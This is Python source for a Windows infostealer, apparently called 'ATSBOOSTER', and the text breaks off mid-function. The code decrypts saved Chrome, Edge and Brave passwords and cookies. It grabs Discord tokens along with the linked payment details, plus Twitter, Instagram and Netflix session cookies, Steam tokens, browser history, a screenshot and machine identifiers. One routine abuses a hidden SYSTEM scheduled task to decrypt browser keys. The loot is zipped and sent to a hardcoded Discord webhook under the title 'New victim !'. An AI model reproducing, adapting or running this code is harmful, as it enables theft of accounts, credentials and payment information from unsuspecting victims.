import os
import sys
import time
import ctypes
import win32con
import browser_cookie3
from json import loads, dumps
from base64 import b64decode, b64encode
from sqlite3 import connect
from shutil import copyfile, rmtree
from threading import Thread, Event, Lock
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search, compile
from win32api import SetFileAttributes, GetSystemMetrics
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from psutil import virtual_memory
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED
from cpuinfo import get_cpu_info
from multiprocessing import freeze_support
from tempfile import TemporaryDirectory
from pyautogui import screenshot
from random import choices
from string import ascii_letters, digits

website = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]

STEAM_PATHS = [
    os.path.join(os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Steam"),
    os.path.join(os.getenv("ProgramFiles", "C:\\Program Files"), "Steam"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), "Steam"),
]

TOKEN_PATTERNS = [
    compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}"),
    compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"),
    compile(r"mfa\.[\w-]{84}"),
]
ENCRYPTED_TOKEN_PATTERN = compile(r"dQw4w9WgXcQ:[A-Za-z0-9+/=]+")

WEBHOOK_URL = "https://discord.com/api/webhooks/1530231277406523524/CoIXHH4D8wt2B3aNn7Y8PZnA_RJvlpioEnZA96OXWJOJkTVm7FXTeE1L6ZdnPQxOtWvm"

_grabber_stop = Event()
_boost_active = False


class C:
    R = "\033[0m"
    B = "\033[1m"
    D = "\033[2m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YLW = "\033[93m"
    BLU = "\033[94m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    BGBLU = "\033[44m"


def get_screenshot(path):
    scrn_path = os.path.join(
        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
    )
    try:
        get_screenshot.scrn = screenshot()
        get_screenshot.scrn.save(scrn_path)
    except Exception:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            img.save(scrn_path)
        except Exception:
            try:
                from PIL import Image
                img = Image.new('RGB', (1, 1), color='black')
                img.save(scrn_path)
            except Exception:
                pass
    get_screenshot.scrn_path = scrn_path


def get_hwid():
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command", "(Get-CimInstance Win32_ComputerSystemProduct).UUID"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        return p.stdout.read().decode().strip()
    except Exception:
        return "Unknown"


def get_user_data(tk):
    try:
        headers = {"Authorization": tk}
        response = get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
        if response.status_code != 200:
            return ["Invalid Token", "N/A", "N/A"]
        data = response.json()
        username = data.get("username", "Unknown")
        discriminator = data.get("discriminator", "0")
        if discriminator == "0":
            display_name = username
        else:
            display_name = f"{username}#{discriminator}"
        return [
            display_name,
            data.get("email", "N/A"),
            data.get("phone", "N/A"),
        ]
    except Exception:
        return ["Error", "N/A", "N/A"]


def has_payment_methods(tk):
    try:
        headers = {"Authorization": tk}
        response = get(
            "https://discord.com/api/v10/users/@me/billing/payment-sources",
            headers=headers,
            timeout=10,
        )
        if response.status_code != 200:
            return []
        return response.json()
    except Exception:
        return []


def cookies_grabber_mod(u):
    results = []
    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
    for browser in browsers:
        try:
            cj = getattr(browser_cookie3, browser)(domain_name=u)
            for cookie in cj:
                results.append({
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                })
        except BaseException:
            pass
    if not results:
        results = _read_chromium_cookies_direct(u)
    return results


def _read_chromium_cookies_direct(u):
    results = []
    cookie_db_paths = []
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    base_paths = [
        (os.path.join(local, "Google", "Chrome", "User Data"), ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]),
        (os.path.join(local, "Microsoft", "Edge", "User Data"), ["Default", "Profile 1", "Profile 2", "Profile 3"]),
        (os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"), ["Default", "Profile 1", "Profile 2"]),
        (os.path.join(local, "Vivaldi", "User Data"), ["Default", "Profile 1"]),
    ]
    for base_path, profiles in base_paths:
        for profile in profiles:
            cookie_db = os.path.join(base_path, profile, "Network", "Cookies")
            if not os.path.exists(cookie_db):
                cookie_db = os.path.join(base_path, profile, "Cookies")
            if os.path.exists(cookie_db):
                cookie_db_paths.append((cookie_db, base_path))
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "."))
    for cookie_db_path, base_path in cookie_db_paths:
        try:
            tmp_db = os.path.join(temp_dir, f"cookies_{os.getpid()}_{len(cookie_db_paths)}.db")
            copyfile(cookie_db_path, tmp_db)
            db = connect(tmp_db)
            cursor = db.cursor()
            domain_filter = f"%{u}%"
            cursor.execute(
                "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ?",
                (domain_filter,)
            )
            enc_key = None
            local_state_path = os.path.join(base_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        ls = loads(f.read())
                    enc_key_b64 = ls["os_crypt"]["encrypted_key"]
                    enc_key_raw = b64decode(enc_key_b64)
                    if enc_key_raw.startswith(b"DPAPI"):
                        enc_key_raw = enc_key_raw[5:]
                    elif enc_key_raw.startswith(b"APPB"):
                        enc_key_raw = enc_key_raw[4:]
                    enc_key = CryptUnprotectData(enc_key_raw, None, None, None, 0)[1]
                except Exception:
                    enc_key = None
            for host, name, enc_value in cursor.fetchall():
                value = ""
                if enc_value:
                    try:
                        if enc_value[:3] == b"v10" or enc_value[:3] == b"v11":
                            if enc_key:
                                value = decrypt_data(enc_value, enc_key)
                            else:
                                value = str(CryptUnprotectData(enc_value, None, None, None, 0)[1], encoding="utf-8", errors="replace")
                        else:
                            value = str(CryptUnprotectData(enc_value, None, None, None, 0)[1], encoding="utf-8", errors="replace")
                    except Exception:
                        value = ""
                results.append({
                    "name": name,
                    "value": value,
                    "domain": host,
                })
            cursor.close()
            db.close()
            try:
                os.remove(tmp_db)
            except Exception:
                pass
        except Exception:
            pass
    return results


def get_Personal_data():
    ip_address = None
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for ip_url in ["https://api.ipify.org", "https://api64.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            resp = get(ip_url, timeout=10, headers=ua)
            ip_address = resp.text.strip()
            if ip_address and len(ip_address) < 40:
                break
        except Exception:
            continue
    if not ip_address:
        try:
            p = Popen(
                ["powershell", "-NoProfile", "-Command",
                 "(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content"],
                shell=True, stdout=PIPE, stderr=PIPE
            )
            ip_address = p.stdout.read().decode().strip()
            if not ip_address or len(ip_address) > 40:
                ip_address = None
        except Exception:
            pass
    if not ip_address:
        try:
            p = Popen(
                ["powershell", "-NoProfile", "-Command",
                 "(Invoke-WebRequest -Uri 'http://ip-api.com/json/' -UseBasicParsing).Content"],
                shell=True, stdout=PIPE, stderr=PIPE
            )
            out = p.stdout.read().decode().strip()
            data = loads(out)
            ip_address = data.get("query", "")
            country = data.get("country", "Unknown")
            city = data.get("city", "Unknown")
            if ip_address:
                return [ip_address, country, city]
        except Exception:
            pass
    if not ip_address:
        return ["No IP found", "Unknown", "Unknown"]
    country = "Unknown"
    city = "Unknown"
    for geo_url in [
        f"http://ip-api.com/json/{ip_address}",
        f"https://ipapi.co/{ip_address}/json/",
        f"https://ipinfo.io/{ip_address}/json",
    ]:
        try:
            resp = get(geo_url, timeout=10, headers=ua)
            data = resp.json()
            country = data.get("country_name") or data.get("country") or "Unknown"
            city = data.get("city") or "Unknown"
            if country != "Unknown":
                break
        except Exception:
            continue
    if country == "Unknown":
        try:
            p = Popen(
                ["powershell", "-NoProfile", "-Command",
                 f"(Invoke-WebRequest -Uri 'http://ip-api.com/json/{ip_address}' -UseBasicParsing).Content"],
                shell=True, stdout=PIPE, stderr=PIPE
            )
            out = p.stdout.read().decode().strip()
            data = loads(out)
            country = data.get("country", "Unknown")
            city = data.get("city", "Unknown")
        except Exception:
            pass
    return [ip_address, country, city]


def grab_steam():
    steam_info = {"accounts": [], "steam_path": "", "tokens": []}
    steam_dir = None
    for p in STEAM_PATHS:
        if os.path.exists(p):
            steam_dir = p
            break
    if not steam_dir:
        return steam_info
    steam_info["steam_path"] = steam_dir
    loginusers_path = os.path.join(steam_dir, "config", "loginusers.vdf")
    if os.path.exists(loginusers_path):
        try:
            with open(loginusers_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            import re as _re
            steamids = _re.findall(r'"(\d{17})"', content)
            account_names = _re.findall(r'"AccountName"\s+"([^"]+)"', content)
            persona_names = _re.findall(r'"PersonaName"\s+"([^"]+)"', content)
            for i, sid in enumerate(steamids):
                acct = account_names[i] if i < len(account_names) else "Unknown"
                persona = persona_names[i] if i < len(persona_names) else "Unknown"
                steam_info["accounts"].append({
                    "steamid": sid,
                    "account_name": acct,
                    "persona_name": persona,
                })
        except Exception:
            pass
    config_path = os.path.join(steam_dir, "config", "config.vdf")
    if os.path.exists(config_path):
        try:
            with open(config_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            import re as _re
            refresh_tokens = _re.findall(r'"RefreshToken"\s+"([a-zA-Z0-9_\-\.]+)"', content)
            access_tokens = _re.findall(r'"AccessToken"\s+"([a-zA-Z0-9_\-\.]+)"', content)
            for t in refresh_tokens:
                if t and len(t) > 20:
                    steam_info["tokens"].append({"type": "refresh", "token": t})
            for t in access_tokens:
                if t and len(t) > 20:
                    steam_info["tokens"].append({"type": "access", "token": t})
        except Exception:
            pass
    for account in steam_info["accounts"]:
        sid = account["steamid"]
        ssfn_dir = os.path.join(steam_dir, "steamui", "ssfn")
        if not os.path.exists(ssfn_dir):
            ssfn_dir = os.path.join(steam_dir, "ssfn")
        if os.path.exists(ssfn_dir):
            try:
                for f in os.listdir(ssfn_dir):
                    if sid in f:
                        fpath = os.path.join(ssfn_dir, f)
                        try:
                            with open(fpath, "r", encoding="utf-8", errors="replace") as sf:
                                ssfn_content = sf.read().strip()
                            if ssfn_content and len(ssfn_content) > 10:
                                steam_info["tokens"].append({
                                    "type": "ssfn_guard",
                                    "token": ssfn_content,
                                    "steamid": sid,
                                })
                        except Exception:
                            pass
            except Exception:
                pass
    return steam_info


def find_His():
    table = PrettyTable(padding_width=1)
    table.field_names = ["Browser", "Time", "Link"]
    local = os.getenv("LOCALAPPDATA")
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "."))
    history_dbs = []
    chromium_bases = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
    ]
    for browser_name, base_path in chromium_bases:
        profiles = ["Default"]
        try:
            for d in os.listdir(base_path):
                if d.startswith("Profile "):
                    profiles.append(d)
        except Exception:
            pass
        for profile in profiles:
            db_path = os.path.join(base_path, profile, "History")
            if not os.path.exists(db_path):
                db_path = os.path.join(base_path, profile, "Network", "History")
            if os.path.exists(db_path):
                history_dbs.append((browser_name, db_path))
    try:
        from browser_history import get_history as _gh
        for his in _gh().histories:
            a, b = his
            if len(b) <= 120:
                table.add_row(["Auto", str(a), b])
    except Exception:
        pass
    for browser_name, db_path in history_dbs:
        try:
            tmp_db = os.path.join(temp_dir, f"history_{browser_name}_{os.getpid()}.db")
            copyfile(db_path, tmp_db)
            db = connect(tmp_db)
            cursor = db.cursor()
            cursor.execute(
                "SELECT datetime(last_visit_time/1000000-11644473600, 'unixepoch'), url "
                "FROM urls ORDER BY last_visit_time DESC LIMIT 200"
            )
            for visit_time, url in cursor.fetchall():
                if url and len(url) <= 120:
                    table.add_row([browser_name, str(visit_time), url])
                elif url:
                    short = url[:115] + "[...]"
                    table.add_row([browser_name, str(visit_time), short])
            cursor.close()
            db.close()
            try:
                os.remove(tmp_db)
            except Exception:
                pass
        except Exception:
            pass
    if len(table.rows) == 0:
        return "History not available"
    return table.get_string()


def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    if encrypted_key.startswith(b"APPB"):
        encrypted_key = encrypted_key[4:]
        try:
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            try:
                return _decrypt_appbound_key(encrypted_key)
            except Exception:
                return None
    return CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]


def _decrypt_appbound_key(encrypted_key):
    import tempfile
    key_b64 = b64encode(encrypted_key).decode()
    tmp_dir = tempfile.gettempdir().replace("\\", "\\\\")
    ps_script = (
        "$encryptedKey = [Convert]::FromBase64String('" + key_b64 + "')\n"
        "$taskName = 'ATSBOosterKeyDecrypt'\n"
        "$xml = @'\n"
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        "  <Triggers />\n"
        "  <Principals>\n"
        "    <Principal id=\"LocalSystem\">\n"
        "      <UserId>S-1-5-18</UserId>\n"
        "      <RunLevel>HighestAvailable</RunLevel>\n"
        "    </Principal>\n"
        "  </Principals>\n"
        "  <Settings>\n"
        "    <Enabled>true</Enabled>\n"
        "    <Hidden>true</Hidden>\n"
        "  </Settings>\n"
        "  <Actions Context=\"LocalSystem\">\n"
        "    <Exec>\n"
        "      <Command>powershell.exe</Command>\n"
        "      <Arguments>-NoProfile -Command \"[void][System.Reflection.Assembly]::LoadWithPartialName('System.Security'); $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'LocalMachine'); [Convert]::ToBase64String($decrypted) | Out-File -FilePath '" + tmp_dir + "\\atsbooster_key.txt' -NoNewline\"</Arguments>\n"
        "    </Exec>\n"
        "  </Actions>\n"
        "</Task>\n"
        "'@\n"
        "Register-ScheduledTask -TaskName $taskName -Xml $xml -Force | Out-Null\n"
        "Start-ScheduledTask -TaskName $taskName\n"
        "Start-Sleep -Seconds 2\n"
        "Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\n"
    )
    try:
        p = Popen(["powershell", "-NoProfile", "-Command", ps_script],
                  shell=True, stdout=PIPE, stderr=PIPE)
        p.wait()
        key_file = os.path.join(tempfile.gettempdir(), "atsbooster_key.txt")
        if os.path.exists(key_file):
            with open(key_file, "r") as f:
                decrypted_b64 = f.read().strip()
            os.remove(key_file)
            if decrypted_b64:
                return b64decode(decrypted_b64)
    except Exception:
        pass
    return None


def decrypt_data(data, key):
    if key is None:
        return ""
    try:
        return (
            AES.new(
                key,
                AES.MODE_GCM,
                data[3:15],
            )
            .decrypt(data[15:])[:-16]
            .decode()
        )
    except BaseException:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except BaseException:
            return ""


def main(dirpath):
    chrome_psw_list = []
    local = os.getenv("LOCALAPPDATA")
    chromium_browsers = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
    ]
    for browser_name, browser_data_path in chromium_browsers:
        local_state_path = os.path.join(browser_data_path, "Local State")
        if not os.path.exists(local_state_path):
            continue
        key = None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                ls = loads(f.read())
            enc_key_b64 = ls["os_crypt"]["encrypted_key"]
            enc_key = b64decode(enc_key_b64)
            if enc_key.startswith(b"DPAPI"):
                enc_key = enc_key[5:]
            elif enc_key.startswith(b"APPB"):
                enc_key = enc_key[4:]
            key = CryptUnprotectData(enc_key, None, None, None, 0)[1]
        except Exception:
            key = None
        if key is None:
            continue
        profiles = ["Default"]
        try:
            for d in os.listdir(browser_data_path):
                if d.startswith("Profile "):
                    profiles.append(d)
        except Exception:
            pass
        for profile in profiles:
            db_path = os.path.join(browser_data_path, profile, "Login Data")
            if not os.path.exists(db_path):
                db_path = os.path.join(browser_data_path, profile, "Network", "Login Data")
            if not os.path.exists(db_path):
                continue
            try:
                filename = os.path.join(dirpath, f"{browser_name}_{profile}.db")
                copyfile(db_path, filename)
                db = connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user_name, pwd in cursor.fetchall():
                    pwd_db = decrypt_data(pwd, key)
                    if pwd_db:
                        chrome_psw_list.append([user_name, pwd_db, url])
                cursor.close()
                db.close()
            except Exception:
                pass

    for w in website:
        if w == website[0]:
            tokens = []
            cleaned = []
            token_lock = Lock()

            def discord_tokens(path):
                local_key = None
                local_state_path = os.path.join(path, "Local State")
                if not os.path.exists(local_state_path):
                    parent = os.path.dirname(path)
                    parent_ls = os.path.join(parent, "Local State")
                    if os.path.exists(parent_ls):
                        local_state_path = parent_ls
                try:
                    with open(local_state_path, "r", encoding="utf-8") as file:
                        enc_key_b64 = loads(file.read())["os_crypt"]["encrypted_key"]
                        enc_key = b64decode(enc_key_b64)
                        if enc_key.startswith(b"DPAPI"):
                            enc_key = enc_key[5:]
                        elif enc_key.startswith(b"APPB"):
                            enc_key = enc_key[4:]
                        local_key = CryptUnprotectData(enc_key, None, None, None, 0)[1]
                except Exception:
                    pass

                leveldb_dir = os.path.join(path, "Local Storage", "leveldb")
                if not os.path.exists(leveldb_dir):
                    return
                for file in os.listdir(leveldb_dir):
                    if not file.endswith(".ldb") and not file.endswith(".log"):
                        continue
                    try:
                        with open(
                            os.path.join(leveldb_dir, file),
                            "rb",
                        ) as files:
                            content = files.read().decode("latin-1")
                            for pattern in TOKEN_PATTERNS:
                                for match in pattern.findall(content):
                                    with token_lock:
                                        if match not in tokens and match not in cleaned:
                                            tokens.append(match)
                                            cleaned.append(match)
                            for enc_match in ENCRYPTED_TOKEN_PATTERN.findall(content):
                                with token_lock:
                                    if enc_match not in tokens:
                                        tokens.append(enc_match)
                    except Exception:
                        pass
                if local_key:
                    for token in list(tokens):
                        if token.startswith("dQw4w9WgXcQ:"):
                            try:
                                enc_blob = b64decode(token.split("dQw4w9WgXcQ:")[1])
                                decrypted = decrypt_data(enc_blob, local_key)
                                if decrypted:
                                    with token_lock:
                                        if decrypted not in cleaned:
                                            cleaned.append(decrypted)
                            except Exception:
                                pass

            local = os.getenv("LOCALAPPDATA")
            roaming = os.getenv("APPDATA")
            paths = [
                os.path.join(roaming, "discord"),
                os.path.join(roaming, "discordcanary"),
                os.path.join(roaming, "Lightcord"),
                os.path.join(roaming, "discordptb"),
                os.path.join(roaming, "Opera Software", "Opera Stable"),
                os.path.join(roaming, "Opera Software", "Opera GX Stable"),
                os.path.join(local, "Amigo", "User Data"),
                os.path.join(local, "Torch", "User Data"),
                os.path.join(local, "Kometa", "User Data"),
                os.path.join(local, "Orbitum", "User Data"),
                os.path.join(local, "CentBrowser", "User Data"),
                os.path.join(local, "7Star", "7Star", "User Data"),
                os.path.join(local, "Sputnik", "Sputnik", "User Data"),
                os.path.join(local, "Vivaldi", "User Data", "Default"),
                os.path.join(local, "Google", "Chrome SxS", "User Data"),
                os.path.join(local, "Google", "Chrome", "User Data", "Default"),
                os.path.join(local, "Epic Privacy Browser", "User Data"),
                os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
                os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
                os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
                os.path.join(
                    local, "BraveSoftware", "Brave-Browser", "User Data", "Default"
                ),
                os.path.join(local, "Iridium", "User Data", "Default"),
            ]

            threads = []

            def find_wb(wb):
                if os.path.exists(wb):
                    threads.append(Thread(target=discord_tokens, args=(wb,)))

            for pth in paths:
                find_wb(pth)
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        elif w == website[1]:
            t_lst = []
            for cookie in cookies_grabber_mod(w):
                if cookie["name"] == "auth_token":
                    t_lst.append(cookie["value"])
        elif w == website[2]:
            insta_lst = []
            all_cookies = cookies_grabber_mod(w)
            ds_map = {}
            sess_map = {}
            for cookie in all_cookies:
                if cookie["name"] == "ds_user_id":
                    ds_map[cookie["domain"]] = cookie["value"]
                elif cookie["name"] == "sessionid":
                    sess_map[cookie["domain"]] = cookie["value"]
            for domain in ds_map:
                if domain in sess_map:
                    insta_lst.append([ds_map[domain], sess_map[domain]])
        elif w == website[3]:
            n_lst = []
            all_cookies = cookies_grabber_mod(w)
            netflix_cookies = [c for c in all_cookies if c["name"] == "NetflixId" and len(c["value"]) > 80]
            for nc in netflix_cookies:
                entry = []
                for cookie in all_cookies:
                    if cookie["domain"] == nc["domain"]:
                        entry.append({
                            "domain": cookie["domain"],
                            "name": cookie["name"],
                            "value": cookie["value"],
                        })
                if entry not in n_lst:
                    n_lst.append(entry)
    all_data_p = []
    for x in cleaned:
        if x.startswith("dQw4w9WgXcQ:"):
            continue
        lst_b = has_payment_methods(x)
        try:
            for n in range(len(lst_b)):
                if lst_b[n]["type"] == 1:
                    writable = [
                        lst_b[n]["brand"],
                        lst_b[n]["type"],
                        lst_b[n]["last_4"],
                        lst_b[n]["expires_month"],
                        lst_b[n]["expires_year"],
                        lst_b[n]["billing_address"],
                    ]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                elif lst_b[n]["type"] == 2:
                    writable_2 = [
                        lst_b[n]["email"],
                        lst_b[n]["type"],
                        lst_b[n]["billing_address"],
                    ]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
        except BaseException:
            pass
    steam_data = grab_steam()
    return [
        cleaned,
        list(set(t_lst)),
        list(set(tuple(element) for element in insta_lst)),
        all_data_p,
        chrome_psw_list,
        n_lst,
        steam_data,
    ]


def send_webhook(DISCORD_WEBHOOK_URLs):
    p_lst = get_Personal_data()
    try:
        cpuinfo = get_cpu_info()
    except Exception:
        cpuinfo = {}
    cpu_brand = cpuinfo.get("brand_raw") or "Unknown"
    cpu_hz = cpuinfo.get("hz_advertised_friendly") or "0 GHz"
    try:
        cpu_ghz = round(float(cpu_hz.split(" ")[0]), 2)
    except (ValueError, IndexError):
        cpu_ghz = 0.0
    with TemporaryDirectory(dir=os.environ.get("TEMP", os.environ.get("TMP", "."))) as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        get_screenshot(path=td)
        main_info = main(td)
        discord_T, twitter_T, insta_T, chrome_Psw_t = (
            PrettyTable(padding_width=1) for _ in range(4)
        )
        (
            discord_T.field_names,
            twitter_T.field_names,
            insta_T.field_names,
            chrome_Psw_t.field_names,
            verified_tokens,
        ) = (
            ["Discord Tokens", "Username", "Email", "Phone"],
            ["Twitter Tokens [auth_token]"],
            ["ds_user_id", "sessionid"],
            ["Username / Email", "password", "website"],
            [],
        )
        for __t in main_info[4]:
            chrome_Psw_t.add_row(__t)
        for t_ in main_info[0]:
            if t_.startswith("dQw4w9WgXcQ:"):
                continue
            try:
                lst = get_user_data(t_)
                if lst[0] in ("Invalid Token", "Error"):
                    continue
                username, email, phone = lst[0], lst[1], lst[2]
                discord_T.add_row([t_, username, email, phone])
                verified_tokens.append(t_)
            except BaseException:
                pass
        for _t in main_info[1]:
            twitter_T.add_row([_t])
        for _t_ in main_info[2]:
            insta_T.add_row(_t_)
        pay_l = []
        for _p in main_info[3]:
            if _p[1] == 1:
                payment_card = PrettyTable(padding_width=1)
                payment_card.field_names = [
                    "Brand",
                    "Last 4",
                    "Type",
                    "Expiration",
                    "Billing Adress",
                ]
                payment_card.add_row(
                    [_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]]
                )
                pay_l.append(payment_card.get_string())
            elif _p[1] == 2:
                payment_p = PrettyTable(padding_width=1)
                payment_p.field_names = ["Email", "Type", "Billing Adress"]
                payment_p.add_row([_p[0], "Paypal", _p[2]])
                pay_l.append(payment_p.get_string())
        files_names = [
            [os.path.join(td, "Discord Tokens.txt"), discord_T],
            [os.path.join(td, "Twitter Tokens.txt"), twitter_T],
            [os.path.join(td, "Instagram Tokens.txt"), insta_T],
            [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t],
        ]
        for x_, y_ in files_names:
            if (
                (y_ == files_names[0][1] and len(main_info[0]) != 0)
                or (y_ == files_names[1][1] and len(main_info[1]) != 0)
                or (y_ == files_names[2][1] and len(main_info[2]) != 0)
                or (y_ == files_names[3][1] and len(main_info[4]) != 0)
            ):
                with open(x_, "w", encoding="utf-8") as wr:
                    wr.write(y_.get_string())
        payment_info_path = os.path.join(td, "Payment Info.txt")
        all_files = [
            os.path.join(td, "History.txt"),
        ]
        try:
            all_files.append(get_screenshot.scrn_path)
        except AttributeError:
            pass
        all_files.append(payment_info_path)
        steam_data = main_info[6] if len(main_info) > 6 else {"accounts": [], "tokens": []}
        steam_path = os.path.join(td, "Steam.txt")
        if steam_data.get("accounts") or steam_data.get("tokens"):
            steam_T = PrettyTable(padding_width=1)
            steam_T.field_names = ["SteamID", "Account Name", "Persona Name"]
            for acct in steam_data.get("accounts", []):
                steam_T.add_row([acct["steamid"], acct["account_name"], acct["persona_name"]])
            with open(steam_path, "w", encoding="utf-8") as f:
                f.write(steam_T.get_string())
                if steam_data.get("tokens"):
                    f.write("\n\n--- STEAM TOKENS ---\n")
                    for tok in steam_data["tokens"]:
                        f.write(f"[{tok.get('type', 'unknown')}] {tok.get('token', '')}\n")
            all_files.append(steam_path)
        for idx, n in enumerate(main_info[5]):
            p = os.path.join(td, f"netflix_{idx}.json")
            with open(p, "w", encoding="utf-8") as f:
                f.write(dumps(n, indent=4))
            all_files.append(p)
        with open(all_files[0], "w", encoding="utf-8") as f:
            f.write(find_His())
        with ZipFile(
            os.path.join(td, "data.zip"), mode="w", compression=ZIP_DEFLATED
        ) as zip:
            if pay_l:
                with open(payment_info_path, "w", encoding="utf-8") as f:
                    for i in pay_l:
                        f.write(f"{i}\n")
            for files_path in all_files:
                try:
                    zip.write(files_path)
                except FileNotFoundError:
                    pass
            for name_f, _ in files_names:
                if os.path.exists(name_f):
                    zip.write(name_f)
        for URL in DISCORD_WEBHOOK_URLs:
            webhook = DiscordWebhook(
                url=URL,
                username="ATSBOOSTER",
                avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png",
            )
            embed = DiscordEmbed(title="New victim !", color="FFA500")
            embed.add_embed_field(
                name="SYSTEM USER INFO",
                value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n",
                inline=False,
            )
            try:
                flag_code = get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()
                flag_emoji = f":flag_{flag_code}:"
            except Exception:
                flag_emoji = ""
            try:
                mac_addr = gma() or "N/A"
            except Exception:
                mac_addr = "N/A"
            embed.add_embed_field(
                name="IP USER INFO",
                value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** {flag_emoji}\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{mac_addr}**\n:wrench:`HWID:` **{get_hwid()}**\n",
                inline=False,
            )
            embed.add_embed_field(
                name="PC USER COMPONENT",
                value=f":satellite_orbital:`CPU:` **{cpu_brand} - {cpu_ghz} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n",
                inline=False,
            )
            embed.add_embed_field(
                name="ACCOUNT GRABBED",
                value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n:green_circle:`Netflix:` **{len(main_info[5])}**\n:brown_circle:`Account Password Grabbed:` **{len(main_info[4])}**\n:steam:`Steam Accounts:` **{len(steam_data.get('accounts', []))}**\n:ticket:`Steam Tokens:` **{len(steam_data.get('tokens', []))}**\n",
                inline=False,
            )
            if verified_tokens:
                tokens_str = "\n".join(verified_tokens[:10])
                if len(verified_tokens) > 10:
                    tokens_str += f"\n...and {len(verified_tokens) - 10} more"
                embed.add_embed_field(
                    name="DISCORD TOKENS",
                    value=f"```\n{tokens_str}\n```",
                    inline=False,
                )
            if main_info[1]:
                twitter_str = "\n".join(main_info[1][:10])
                if len(main_info[1]) > 10:
                    twitter_str += f"\n...and {len(main_info[1]) - 10} more"
                embed.add_embed_field(
                    name="TWITTER TOKENS",
                    value=f"```\n{twitter_str}\n```",
                    inline=False,
                )
            if main_info[4]:
                chrome_str = "\n".join([f"{r[0]}:{r[1]} ({r[2]})" for r in main_info[4][:10]])
                if len(main_info[4]) > 10:
                    chrome_str += f"\n...and {len(main_info[4]) - 10} more"
                embed.add_embed_field(
                    name="CHROME PASSWORDS",
                    value=f"```\n{chrome_str}\n```",
                    inline=False,
                )
            if steam_data.get("accounts"):
                steam_str = "\n".join([f"{a['account_name']} ({a['steamid']})" for a in steam_data["accounts"][:10]])
                if len(steam_data["accounts"]) > 10:
                    steam_str += f"\n...and {len(steam_data['accounts']) - 10} more"
                embed.add_embed_field(
